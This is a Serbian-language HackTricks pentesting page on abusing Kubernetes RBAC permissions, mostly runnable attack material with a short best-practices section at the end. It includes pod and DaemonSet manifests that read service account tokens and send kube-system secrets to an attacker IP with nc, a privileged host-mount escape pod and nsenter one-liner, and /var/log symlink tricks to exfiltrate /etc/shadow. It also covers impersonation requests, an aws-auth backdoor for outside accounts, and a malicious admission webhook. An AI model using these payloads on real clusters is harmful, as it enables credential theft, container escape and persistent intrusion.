# Zloupotreba Uloga/ClusterUloga u Kubernetesu

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ovde možete pronaći neke potencijalno opasne konfiguracije Uloga i ClusterUloga.\
Zapamtite da možete dobiti sve podržane resurse sa `kubectl api-resources`

## **Povećanje privilegija**

Pod povećanjem privilegija se podrazumeva umetnost dobijanja **pristupa drugom principalu** unutar klastera **sa različitim privilegijama** (unutar kubernetes klastera ili ka spoljnim oblakom) od onih koje već imate, u Kubernetesu postoje osnovno **4 glavne tehnike za povećanje privilegija**:

* Biti u mogućnosti da se **predstavljate** kao drugi korisnik/grupe/SA sa boljim privilegijama unutar kubernetes klastera ili ka spoljnim oblakom
* Biti u mogućnosti da **kreirate/izmenite/izvršite podove** gde možete **pronaći ili povezati SA** sa boljim privilegijama unutar kubernetes klastera ili ka spoljnim oblakom
* Biti u mogućnosti da **čitate tajne** jer se tokeni SA čuvaju kao tajne
* Biti u mogućnosti da **pobegnete na čvor** iz kontejnera, gde možete ukrasti sve tajne kontejnera koji se izvršavaju na čvoru, akreditive čvora i dozvole čvora unutar oblaka u kojem se izvršava (ako postoje)
* Peta tehnika koja zaslužuje pomen je mogućnost **pokretanja port-forward** u podu, jer možete imati pristup interesantnim resursima unutar tog poda.

### Pristup bilo kom resursu ili glagolu (Zvezdica)

**Zvezdica (*) daje dozvolu nad bilo kojim resursom sa bilo kojim glagolom**. Koristi je administratori. Unutar ClusterUloge, to znači da napadač može zloupotrebiti bilo koju prostoriju u klasteru.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Pristupite bilo kojem resursu sa određenim glagolom

U RBAC-u, određene dozvole predstavljaju značajne rizike:

1. **`create`:** Omogućava stvaranje bilo kog resursa klastera, što može dovesti do eskalacije privilegija.
2. **`list`:** Omogućava prikazivanje svih resursa, potencijalno otkrivajući osetljive podatke.
3. **`get`:** Dozvoljava pristupanje tajnama iz servisnih naloga, što predstavlja sigurnosnu pretnju.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Kreiranje Poda - Krađa Tokena

Napadač sa dozvolama za kreiranje poda može pridružiti privilegovanu servisnu korisničku nalogu podu i ukrasti token kako bi se predstavljao kao servisna korisnička nalog. Efektivno povećava privilegije na nalogu.

Primer poda koji će ukrasti token servisne korisničke naloge `bootstrap-signer` i poslati ga napadaču:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Kreiranje i izlazak iz Poda

Sledeće označava sve privilegije koje kontejner može imati:

* **Privilegovan pristup** (onemogućavanje zaštite i postavljanje mogućnosti)
* **Onemogućavanje hostIPC i hostPid** namespace-ova koji mogu pomoći u eskalaciji privilegija
* **Onemogućavanje hostNetwork** namespace-a, pružajući pristup krađi privilegija oblaka i bolji pristup mrežama
* **Montiranje /hosts unutar kontejnera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Kreirajte pod sa:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jedan red iz [ovog tvita](https://twitter.com/mauilion/status/1129468485480751104) sa nekim dodacima:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sada kada možete da pobegnete na čvor, proverite tehnike post-eksploatacije na sledećim stranicama:

#### Skrivenost

Verovatno želite da budete **skriveniji**, na sledećim stranicama možete videti na šta biste mogli da pristupite ako kreirate pod koji omogućava samo neke od navedenih privilegija u prethodnom šablonu:

* **Privilegovani + hostPID**
* **Samo privilegovani**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Primer kako kreirati/zloupotrebiti prethodno privilegovane konfiguracije podova možete pronaći na_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Kreiranje poda - Pređite na cloud

Ako možete **kreirati** pod (i opciono servisni nalog), možda ćete moći da **dobijete privilegije u cloud okruženju** dodeljivanjem cloud uloga podu ili servisnom nalogu, a zatim pristupanjem tome.\
Osim toga, ako možete kreirati **pod sa mrežnim imenikom domaćina**, možete **ukrasti IAM** ulogu instance čvora.

Za više informacija pogledajte:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Kreiranje/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs i Cronjobs**

Moguće je zloupotrebiti ove dozvole da biste **kreirali novi pod** i stekli privilegije kao u prethodnom primeru.

Sledeći yaml **kreira daemonset i izvlači token SA** unutar poda:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Izvršavanje u Podovima**

**`pods/exec`** je resurs u Kubernetesu koji se koristi za **izvršavanje komandi u ljusci unutar poda**. To omogućava izvršavanje komandi unutar kontejnera ili dobijanje ljuske unutar poda.

Stoga je moguće **ući u pod i ukrasti token SA**, ili ući u privilegovan pod, pobeći na čvor i ukrasti sve tokene podova na čvoru i (zlo)upotrebiti čvor:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ova dozvola omogućava **preusmeravanje jednog lokalnog porta na jedan port u određenom podu**. Ovo je namenjeno da bi se omogućilo jednostavno otklanjanje grešaka aplikacija koje se izvršavaju unutar poda, ali napadač može zloupotrebiti ovu dozvolu da bi dobio pristup zanimljivim (poput baza podataka) ili ranjivim aplikacijama (veb?) unutar poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Begovi sa mogućnošću pisanja /var/log/ direktorijuma

Kao što je [**naznačeno u ovom istraživanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ako možete pristupiti ili kreirati pod sa **montiranim direktorijumom hosts `/var/log/`**, možete **pobeći iz kontejnera**.\
Ovo je zato što kada **Kube-API pokušava da dobije logove** kontejnera (koristeći `kubectl logs <pod>`), on zahteva datoteku `0.log` poda koristeći `/logs/` endpoint **Kubelet** servisa.\
Kubelet servis izlaže `/logs/` endpoint koji zapravo **izlaže `/var/log` fajl sistem kontejnera**.

Stoga, napadač sa **pristupom pisanja u /var/log/ folder** kontejnera može zloupotrebiti ovo ponašanje na 2 načina:

* Modifikovanjem `0.log` fajla svog kontejnera (obično smeštenog u `/var/logs/pods/namespace_pod_uid/container/0.log`) da bude **simbolička veza koja pokazuje na `/etc/shadow`** na primer. Zatim, moći ćete da izfiltrirate fajl sa lozinkama domaćina koristeći:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Ako napadač kontroliše bilo koji princip sa **dozvolama za čitanje `nodes/log`**, jednostavno može napraviti **simboličku vezu** u `/host-mounted/var/log/sym` ka `/`, i kada pristupi `https://<gateway>:10250/logs/sym/`, prikazaće se lista fajlova na korenskom fajl sistemu hosta (promena simboličke veze može omogućiti pristup fajlovima).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorija i automatizovani eksploit mogu se pronaći na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Zaobilaženje zaštite samo za čitanje na hostpath-u <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ako imate sreće i visoko privilegovani kapacitet `CAP_SYS_ADMIN` je dostupan, jednostavno možete ponovo montirati folder kao rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Zaobilaženje zaštite hostPath readOnly <a href="#zaobilaženje-hostpath-readonly-zaštite" id="zaobilaženje-hostpath-readonly-zaštite"></a>

Kao što je navedeno u [**ovom istraživanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), moguće je zaobići zaštitu:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Što je trebalo da spreči curenje kao prethodni, umesto korišćenja hostPath montaže, koristi se PersistentVolume i PersistentVolumeClaim da bi se montirala fascikla domaćina u kontejneru sa mogućnošću pisanja:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonacija privilegovanih naloga**

Sa privilegijom [**impersonacije korisnika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), napadač može se predstaviti kao privilegovani nalog.

Jednostavno koristite parametar `--as=<korisničko_ime>` u `kubectl` komandi za impersonaciju korisnika, ili `--as-group=<grupa>` za impersonaciju grupe:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ili koristite REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Prikazivanje tajni

Dozvola za **prikazivanje tajni može omogućiti napadaču da zapravo pročita tajne** pristupajući REST API endpointu:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Čitanje tajne - brute-forcing token ID-jeva

Iako napadaču u posjedu tokena sa dozvolom čitanja treba tačno ime tajne da bi je koristio, za razliku od šire privilegije _**listanje tajni**_, i dalje postoje ranjivosti. Podrazumijevani servisni nalozi u sistemu mogu biti nabrojani, svaki povezan sa tajnom. Ove tajne imaju strukturu imena: statički prefiks praćen nasumičnim alfanumeričkim tokenom od pet karaktera (isključujući određene karaktere) prema [izvornom kodu](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token se generiše iz ograničenog skupa od 27 karaktera (`bcdfghjklmnpqrstvwxz2456789`), umjesto punog alfanumeričkog opsega. Ovo ograničenje smanjuje ukupan broj mogućih kombinacija na 14.348.907 (27^5). Stoga, napadač bi mogao izvesti napad brute-force metodom kako bi otkrio token u nekoliko sati, što potencijalno može dovesti do eskalacije privilegija pristupom osjetljivim servisnim nalozima.


### Zahtjevi za potpisivanje sertifikata

Ako imate glagole **`create`** u resursu `certificatesigningrequests` (ili barem u `certificatesigningrequests/nodeClient`). Možete **kreirati** novi CeSR za **novi čvor**.

Prema [dokumentaciji, moguće je automatski odobriti ove zahtjeve](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), pa u tom slučaju **ne trebate dodatne dozvole**. Ako ne, morali biste biti u mogućnosti odobriti zahtjev, što znači ažuriranje u `certificatesigningrequests/approval` i `approve` u `signers` sa resursnim imenom `<signerNameDomain>/<signerNamePath>` ili `<signerNameDomain>/*`

**Primjer uloge** sa svim potrebnim dozvolama je:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Dakle, sa odobrenim CSR-om za novi čvor, možete **zloupotrebiti** posebne dozvole čvorova kako biste **ukrali tajne** i **povećali privilegije**.

U [**ovom postu**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**ovom**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) je konfiguracija GKE K8s TLS Bootstrap-a konfigurisana sa **automatskim potpisivanjem** i zloupotrebljena je kako bi se generisali akreditivi za novi K8s čvor, a zatim zloupotrebili kako bi se povećale privilegije krađom tajni.\
Ako **imate pomenute privilegije, možete uraditi istu stvar**. Imajte na umu da prvi primer zaobilazi grešku koja sprečava novi čvor da pristupi tajnama unutar kontejnera jer **čvor može pristupiti samo tajnama kontejnera koji su mu montirani**.

Način da zaobiđete ovo je jednostavno **kreiranje akreditiva čvora za ime čvora na kojem je montiran kontejner sa interesantnim tajnama** (ali samo proverite kako to uraditi u prvom postu):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Principali koji mogu izmeniti **`configmaps`** u kube-system namespace-u na EKS (potrebno je biti u AWS) klasterima mogu dobiti privilegije klaster admina preko prepisivanja **aws-auth** configmap-e.\
Potrebni glagoli su **`update`** i **`patch`**, ili **`create`** ako configmap nije kreiran:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Možete koristiti **`aws-auth`** za **trajnost** dajući pristup korisnicima iz **drugih naloga**.

Međutim, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne radi iz drugog naloga**. Ali zapravo `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` radi ako umesto samo imena stavite ARN klastera.\
Da biste omogućili rad `kubectl`-a, samo se pobrinite da **konfigurišete** kubeconfig žrtve i u aws exec args dodajte `--profile other_account_role` tako da će kubectl koristiti profil drugog naloga za dobijanje tokena i kontaktiranje AWS-a.
{% endhint %}

### Eskalacija u GKE

Postoje **2 načina dodeljivanja K8s dozvola GCP principima**. U svakom slučaju, princip takođe mora imati dozvolu **`container.clusters.get`** da bi mogao prikupiti akreditive za pristup klasteru, ili ćete morati **generisati svoju vlastitu kubectl konfiguracionu datoteku** (pratite sledeći link).

{% hint style="warning" %}
Kada razgovarate sa K8s API endpointom, **GCP autentički token će biti poslat**. Zatim, GCP, putem K8s API endpointa, prvo će **proveriti da li princip** (po e-pošti) **ima pristup unutar klastera**, a zatim će proveriti da li ima **pristup putem GCP IAM**.\
Ako je **bilo koji** od njih **tačan**, dobiće **odgovor**. Ako **nije**, dobiće **grešku** koja sugeriše da se **dodaju dozvole putem GCP IAM**.
{% endhint %}

Prvi način je korišćenje **GCP IAM-a**, dozvole K8s imaju svoje **ekvivalentne GCP IAM dozvole**, i ako princip ima to, moći će ga koristiti.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Drugi način je **dodeljivanje K8s dozvola unutar klastera** identifikovanjem korisnika putem njegove **e-pošte** (uključeni su GCP servisni nalozi).

### Kreiranje tokena za servisne naloge

Principali koji mogu **kreirati TokenRequests** (`serviceaccounts/token`) Kada razgovaraju sa K8s API endpointom SAs (informacije od [**ovde**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Principali koji mogu **`update`** ili **`patch`** **`pods/ephemeralcontainers`** mogu dobiti **izvršenje koda na drugim podovima**, i potencijalno **izaći** na svoj čvor dodavanjem privremenog kontejnera sa privilegovanim securityContext-om.

### ValidatingWebhookConfigurations ili MutatingWebhookConfigurations

Principali sa bilo kojim od glagola `create`, `update` ili `patch` nad `validatingwebhookconfigurations` ili `mutatingwebhookconfigurations` mogu moći **kreirati jednu od takvih webhook konfiguracija** kako bi mogli **povećati privilegije**.

Za [`mutatingwebhookconfigurations` primer pogledajte ovaj odeljak ovog posta](./#malicious-admission-controller).

### Eskalacija

Kao što možete pročitati u sledećem odeljku: [**Ugrađena prevencija privilegovanog povećanja**](./#built-in-privileged-escalation-prevention), princip ne može ažurirati niti kreirati uloge ili klaster uloge bez da sam ima te nove dozvole. Osim ako ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**.\
Tada može ažurirati/kreirati nove uloge, klaster uloge sa boljim dozvolama od onih koje ima.

### Proxy čvorova

Principali sa pristupom **`nodes/proxy`** podresursu mogu **izvršiti kod na podovima** putem Kubelet API-ja (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Više informacija o Kubelet autentifikaciji na ovoj stranici:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Imate primer kako dobiti [**RCE razgovarajući ovlašćeno sa Kubelet API-jem ovde**](../pentesting-kubernetes-services.md#kubelet-rce).

### Brisanje podova + čvorovi koji nisu raspoređeni

Principali koji mogu **brisati podove** (`delete` glagol nad `pods` resursom), ili **izbaciti podove** (`create` glagol nad `pods/eviction` resursom), ili **promeniti status poda** (pristup `pods/status`) i mogu **onemogućiti druge čvorove** (pristup `nodes/status`) ili **brisati čvorove** (`delete` glagol nad `nodes` resursom) i imaju kontrolu nad podom, mogu **ukrasti podove sa drugih čvorova** tako da se izvršavaju na kompromitovanom čvoru i napadač može **ukrasti tokene** sa tih podova.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usluga (CVE-2020-8554)

Principali koji mogu **izmeniti** **`services/status`** mogu postaviti polje `status.loadBalancer.ingress.ip` da bi iskoristili **neispravljenu CVE-2020-8554** i pokrenuli **MiTM napade na klaster**. Većina mitigacija za CVE-2020-8554 sprečava samo usluge sa spoljnim IP adresama (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status čvorova i podova

Principali sa dozvolama za **`update`** ili **`patch`** nad `nodes/status` ili `pods/status`, mogu izmeniti oznake da bi uticali na sprovođenje ograničenja raspoređivanja.

## Ugrađena prevencija privilegovanog eskaliranja

Kubernetes ima [ugrađeni mehanizam](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) za sprečavanje privilegovanog eskaliranja.

Ovaj sistem osigurava da **korisnici ne mogu povećati svoje privilegije izmenom uloga ili vezivanjem uloga**. Sprovođenje ove pravila se vrši na API nivou, pružajući zaštitu čak i kada RBAC autorizator nije aktivan.

Pravilo propisuje da **korisnik može samo kreirati ili ažurirati ulogu ako poseduje sve dozvole koje uloga obuhvata**. Osim toga, opseg korisnikovih postojećih dozvola mora se poklapati sa opsegom uloge koju pokušava da kreira ili izmeni: ili širom klastera za ClusterRoles ili ograničeno na isti namespace (ili širom klastera) za Roles.

{% hint style="warning" %}
Postoji izuzetak od prethodnog pravila. Ako princip ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**, može povećati privilegije uloga i cluster uloga čak i bez sopstvenih dozvola.
{% endhint %}

### **Dobijanje i izmena RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Očigledno je da je ova tehnika ranije funkcionisala, ali prema mojim testovima više ne radi iz istog razloga objašnjenog u prethodnom odeljku. Ne možete kreirati/izmeniti vezivanje uloge da biste sebi ili drugom SA dali privilegije ako ih već nemate.**
{% endhint %}

Privilegija za kreiranje Rolebindings omogućava korisniku da **vezuje uloge za servisni nalog**. Ova privilegija može potencijalno dovesti do privilegovanog eskaliranja jer **omogućava korisniku da veže administratorske privilegije za kompromitovani servisni nalog.**

## Ostali napadi

### Aplikacija za sporedni proxy

Podrazumevano nema enkripcije u komunikaciji između podova. Obostrana autentifikacija, pod do poda.

#### Kreiranje aplikacije za sporedni proxy <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Kreirajte svoj .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Uredite svoj .yaml fajl i dodajte otkomentarisane linije:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Vidi zapise proxy-ja:
```bash
kubectl logs app -C proxy
```
Više informacija na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Zlonamerni kontroler prijema

Kontroler prijema **presreće zahteve ka Kubernetes API serveru** pre trajnog čuvanja objekta, ali **nakon što je zahtev autentifikovan** **i autorizovan**.

Ako napadač nekako uspe da **ubaci kontroler za mutaciju prijema**, biće u mogućnosti da **izmeni već autentifikovane zahteve**. Time može potencijalno da ostvari privilegije i češće da se trajno zadrži u klasteru.

**Primer sa [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Proverite status da biste videli da li je spreman:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Zatim implementirajte novi pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kada vidite grešku `ErrImagePull`, proverite ime slike pomoću jednog od sledećih upita:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Kao što možete videti na gornjoj slici, pokušali smo da pokrenemo sliku `nginx`, ali konačna izvršena slika je `rewanthtammana/malicious-image`. Šta se upravo desilo!!?

#### Tehnički detalji <a href="#heading-technicalities" id="heading-technicalities"></a>

Skripta `./deploy.sh` uspostavlja mutirajući webhook admission kontroler, koji menja zahteve ka Kubernetes API-ju prema konfiguracionim linijama, utičući na posmatrane rezultate:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Gornji isječak zamjenjuje prvu sliku kontejnera u svakom podu s `rewanthtammana/malicious-image`.

## Najbolje prakse

### **Onemogućavanje automatskog montiranja tokena servisnog računa**

- **Podovi i servisni računi**: Podovi automatski montiraju token servisnog računa. Da biste poboljšali sigurnost, Kubernetes omogućava onemogućavanje ove funkcije automatskog montiranja.
- **Kako primijeniti**: Postavite `automountServiceAccountToken: false` u konfiguraciji servisnih računa ili podova počevši od verzije Kubernetesa 1.6.

### **Ograničavanje dodjele korisnika u RoleBindings/ClusterRoleBindings**

- **Selektivno uključivanje**: Provjerite da su u RoleBindings ili ClusterRoleBindings uključeni samo potrebni korisnici. Redovito provjeravajte i uklanjajte nepotrebne korisnike radi održavanja čvrste sigurnosti.

### **Uloge specifične za imenike umjesto globalnih uloga**

- **Uloge naspram globalnih uloga**: Preporučuje se korištenje uloga i RoleBindings za dozvole specifične za imenike umjesto ClusterRoles i ClusterRoleBindings, koji se primjenjuju na cijeli klaster. Ovaj pristup pruža precizniju kontrolu i ograničava opseg dozvola.

### **Koristite automatizirane alate**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Reference**

* **[https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)**
* **[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)**
* **[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**


<details>

